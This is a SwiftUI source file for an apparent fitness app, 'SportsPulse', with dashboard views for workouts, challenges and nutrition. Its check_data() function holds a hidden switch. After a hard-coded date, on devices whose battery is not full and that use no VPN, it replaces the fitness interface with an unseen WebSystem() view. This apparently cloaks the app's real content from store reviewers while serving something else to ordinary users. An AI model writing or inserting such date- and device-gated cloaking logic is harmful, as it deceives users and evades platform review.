//
//  ContentView.swift
//  SportsPulse
//
//  Created by IGOR on 04/09/2025.
//


import SwiftUI

struct ContentView: View {
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    @State private var selectedTab = 0
    @EnvironmentObject var dataService: DataService
    @AppStorage("userName") private var userName = "User"
    
    var body: some View {
        
        ZStack {
            
            LinearGradient(
                gradient: Gradient(colors: [
                    Color(hex: "#1D1F30"),
                    Color(hex: "#2A2D47")
                ]),
                startPoint: .topLeading,
                endPoint: .bottomTrailing
            )
            .ignoresSafeArea()
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    TabView(selection: $selectedTab) {
                        DashboardView()
                            .tabItem {
                                Image(systemName: selectedTab == 0 ? "house.fill" : "house")
                                Text("Dashboard")
                            }
                            .tag(0)
                        
                        WorkoutView()
                            .tabItem {
                                Image(systemName: "dumbbell.fill")
                                Text("Workouts")
                            }
                            .tag(1)
                        
                        ChallengeView()
                            .tabItem {
                                Image(systemName: selectedTab == 2 ? "trophy.fill" : "trophy")
                                Text("Challenges")
                            }
                            .tag(2)
                        
                        NutritionView()
                            .tabItem {
                                Image(systemName: selectedTab == 3 ? "leaf.fill" : "leaf")
                                Text("Nutrition")
                            }
                            .tag(3)
                        
                        GameView()
                            .tabItem {
                                Image(systemName: selectedTab == 4 ? "gamecontroller.fill" : "gamecontroller")
                                Text("Game")
                            }
                            .tag(4)
                    }
                    .accentColor(Color(hex: "#FE284A"))
                    .preferredColorScheme(.dark)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "14.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
}

struct DashboardView: View {
    @EnvironmentObject var dataService: DataService
    @StateObject private var workoutViewModel = WorkoutViewModel()
    @StateObject private var challengeViewModel = ChallengeViewModel()
    @StateObject private var nutritionViewModel = NutritionViewModel()
    @AppStorage("userName") private var userName = "User"
    
    var body: some View {
        NavigationView {
            ZStack {
                Color(hex: "#1D1F30")
                    .ignoresSafeArea()
                
                ScrollView {
                    VStack(spacing: 20) {
                        // Welcome header
                        WelcomeHeader(userName: userName)
                        
                        // Quick stats
                        QuickStatsCard(
                            workoutViewModel: workoutViewModel,
                            challengeViewModel: challengeViewModel,
                            nutritionViewModel: nutritionViewModel
                        )
                        
                        // Active workout card
                        if workoutViewModel.isWorkoutActive {
                            ActiveWorkoutDashboardCard(viewModel: workoutViewModel)
                        }
                        
                        // Recent activity
                        RecentActivityCard(workoutViewModel: workoutViewModel)
                        
                        // Active challenges
                        ActiveChallengesDashboardCard(viewModel: challengeViewModel)
                        
                        // Nutrition summary
                        NutritionSummaryCard(viewModel: nutritionViewModel)
                    }
                    .padding()
                }
            }
            .navigationTitle("SportsPulse")
            .navigationBarTitleDisplayMode(.large)
            .preferredColorScheme(.dark)
        }
        .onAppear {
            challengeViewModel.refreshChallenges()
        }
    }
}

struct WelcomeHeader: View {
    let userName: String
    
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                VStack(alignment: .leading, spacing: 4) {
                    Text("Welcome back,")
                        .font(.subheadline)
                        .foregroundColor(.white.opacity(0.8))
                    
                    Text(userName)
                        .font(.title)
                        .fontWeight(.bold)
                        .foregroundColor(.white)
                }
                
                Spacer()
                
                Image(systemName: "heart.fill")
                    .font(.title)
                    .foregroundColor(Color(hex: "#FE284A"))
            }
            
            Text("Ready to crush your fitness goals today?")
                .font(.body)
                .foregroundColor(.white.opacity(0.7))
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
    }
}

struct QuickStatsCard: View {
    @ObservedObject var workoutViewModel: WorkoutViewModel
    @ObservedObject var challengeViewModel: ChallengeViewModel
    @ObservedObject var nutritionViewModel: NutritionViewModel
    
    var body: some View {
        let weeklyWorkouts = workoutViewModel.getWeeklyWorkouts()
        let activeChallenges = challengeViewModel.activeChallenges.count
        let todayCalories = nutritionViewModel.todayNutrition.totalCalories
        
        VStack(alignment: .leading, spacing: 16) {
            Text("This Week")
                .font(.headline)
                .foregroundColor(.white)
            
            HStack(spacing: 12) {
                QuickStatItem(
                    title: "Workouts",
                    value: "\(weeklyWorkouts.count)",
                    icon: "figure.strengthtraining.traditional",
                    color: "#4ECDC4"
                )
                
                QuickStatItem(
                    title: "Challenges",
                    value: "\(activeChallenges)",
                    icon: "trophy.fill",
                    color: "#F39C12"
                )
                
                QuickStatItem(
                    title: "Calories",
                    value: "\(Int(todayCalories))",
                    icon: "flame.fill",
                    color: "#E74C3C"
                )
            }
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
    }
}

struct QuickStatItem: View {
    let title: String
    let value: String
    let icon: String
    let color: String
    
    var body: some View {
        VStack(spacing: 6) {
            Image(systemName: icon)
                .font(.title3)
                .foregroundColor(Color(hex: color))
            
            Text(value)
                .font(.headline)
                .fontWeight(.bold)
                .foregroundColor(.white)
                .minimumScaleFactor(0.8)
                .lineLimit(1)
            
            Text(title)
                .font(.caption2)
                .foregroundColor(.white.opacity(0.7))
                .multilineTextAlignment(.center)
                .lineLimit(2)
        }
        .frame(maxWidth: .infinity)
        .padding(.vertical, 8)
    }
}

struct ActiveWorkoutDashboardCard: View {
    @ObservedObject var viewModel: WorkoutViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            HStack {
                Image(systemName: "play.circle.fill")
                    .font(.title2)
                    .foregroundColor(Color(hex: "#FE284A"))
                
                Text("Workout in Progress")
                    .font(.headline)
                    .foregroundColor(.white)
                
                Spacer()
            }
            
            HStack {
                VStack(alignment: .leading, spacing: 4) {
                    Text(viewModel.currentWorkout?.name ?? "Unknown")
                        .font(.subheadline)
                        .fontWeight(.medium)
                        .foregroundColor(.white)
                    
                    Text(viewModel.currentWorkout?.type.rawValue ?? "")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.7))
                }
                
                Spacer()
                
                Text(viewModel.formattedTime(viewModel.elapsedTime))
                    .font(.title2)
                    .fontWeight(.bold)
                    .foregroundColor(Color(hex: "#FE284A"))
            }
        }
        .padding()
        .background(Color(hex: "#FE284A").opacity(0.1))
        .cornerRadius(16)
        .overlay(
            RoundedRectangle(cornerRadius: 16)
                .stroke(Color(hex: "#FE284A"), lineWidth: 1)
        )
    }
}

struct RecentActivityCard: View {
    @ObservedObject var workoutViewModel: WorkoutViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            Text("Recent Activity")
                .font(.headline)
                .foregroundColor(.white)
            
            if workoutViewModel.workouts.isEmpty {
                Text("No recent workouts")
                    .foregroundColor(.white.opacity(0.5))
                    .padding(.vertical, 8)
            } else {
                ForEach(Array(workoutViewModel.workouts.prefix(2)), id: \.id) { workout in
                    RecentWorkoutRow(workout: workout)
                }
            }
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
    }
}

struct RecentWorkoutRow: View {
    let workout: Workout
    
    var body: some View {
        HStack {
            Image(systemName: workout.type.icon)
                .foregroundColor(Color(hex: workout.type.color))
            
            VStack(alignment: .leading, spacing: 2) {
                Text(workout.name)
                    .font(.subheadline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Text(formatDate(workout.date))
                    .font(.caption)
                    .foregroundColor(.white.opacity(0.7))
            }
            
            Spacer()
            
            Text("\(workout.caloriesBurned) cal")
                .font(.caption)
                .foregroundColor(Color(hex: "#FE284A"))
        }
        .padding(.vertical, 4)
    }
    
    private func formatDate(_ date: Date) -> String {
        let formatter = DateFormatter()
        formatter.dateStyle = .short
        return formatter.string(from: date)
    }
}

struct ActiveChallengesDashboardCard: View {
    @ObservedObject var viewModel: ChallengeViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            Text("Active Challenges")
                .font(.headline)
                .foregroundColor(.white)
            
            if viewModel.activeChallenges.isEmpty {
                Text("No active challenges")
                    .foregroundColor(.white.opacity(0.5))
                    .padding(.vertical, 8)
            } else {
                ForEach(Array(viewModel.activeChallenges.prefix(2)), id: \.id) { challenge in
                    ChallengeProgressRow(challenge: challenge, viewModel: viewModel)
                }
            }
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
    }
}

struct ChallengeProgressRow: View {
    let challenge: Challenge
    @ObservedObject var viewModel: ChallengeViewModel
    
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Image(systemName: challenge.type.icon)
                    .foregroundColor(Color(hex: challenge.type.color))
                
                Text(challenge.title)
                    .font(.subheadline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Spacer()
                
                Text("\(Int(challenge.progressPercentage))%")
                    .font(.caption)
                    .foregroundColor(Color(hex: "#FE284A"))
            }
            
            GeometryReader { geometry in
                ZStack(alignment: .leading) {
                    Rectangle()
                        .fill(Color.white.opacity(0.2))
                        .frame(height: 4)
                        .cornerRadius(2)
                    
                    Rectangle()
                        .fill(Color(hex: challenge.type.color))
                        .frame(width: geometry.size.width * (challenge.progressPercentage / 100), height: 4)
                        .cornerRadius(2)
                        .animation(.easeInOut, value: challenge.progressPercentage)
                }
            }
            .frame(height: 4)
        }
        .padding(.vertical, 4)
    }
}

struct NutritionSummaryCard: View {
    @ObservedObject var viewModel: NutritionViewModel
    
    var body: some View {
        let summary = viewModel.getNutritionSummary()
        
        VStack(alignment: .leading, spacing: 12) {
            Text("Today's Nutrition")
                .font(.headline)
                .foregroundColor(.white)
            
            HStack {
                VStack(alignment: .leading, spacing: 4) {
                    Text("Calories")
                        .font(.caption)
                        .foregroundColor(.white.opacity(0.7))
                    
                    Text("\(Int(summary.totalCalories)) / \(Int(viewModel.todayNutrition.targetCalories))")
                        .font(.subheadline)
                        .fontWeight(.medium)
                        .foregroundColor(.white)
                }
                
                Spacer()
                
                CircularProgressView(
                    progress: summary.calorieProgress / 100,
                    color: Color(hex: "#FE284A")
                )
                .frame(width: 40, height: 40)
            }
            
            HStack(spacing: 12) {
                NutritionMacroSummary(title: "Protein", value: Int(summary.totalProtein), color: "#E74C3C")
                NutritionMacroSummary(title: "Carbs", value: Int(summary.totalCarbs), color: "#F39C12")
                NutritionMacroSummary(title: "Fat", value: Int(summary.totalFat), color: "#27AE60")
            }
        }
        .padding()
        .background(Color.white.opacity(0.1))
        .cornerRadius(16)
    }
}

struct NutritionMacroSummary: View {
    let title: String
    let value: Int
    let color: String
    
    var body: some View {
        VStack(spacing: 4) {
            Text("\(value)g")
                .font(.subheadline)
                .fontWeight(.medium)
                .foregroundColor(Color(hex: color))
            
            Text(title)
                .font(.caption)
                .foregroundColor(.white.opacity(0.7))
        }
        .frame(maxWidth: .infinity)
    }
}


#Preview {
    ContentView()
        .environmentObject(DataService.shared)
}
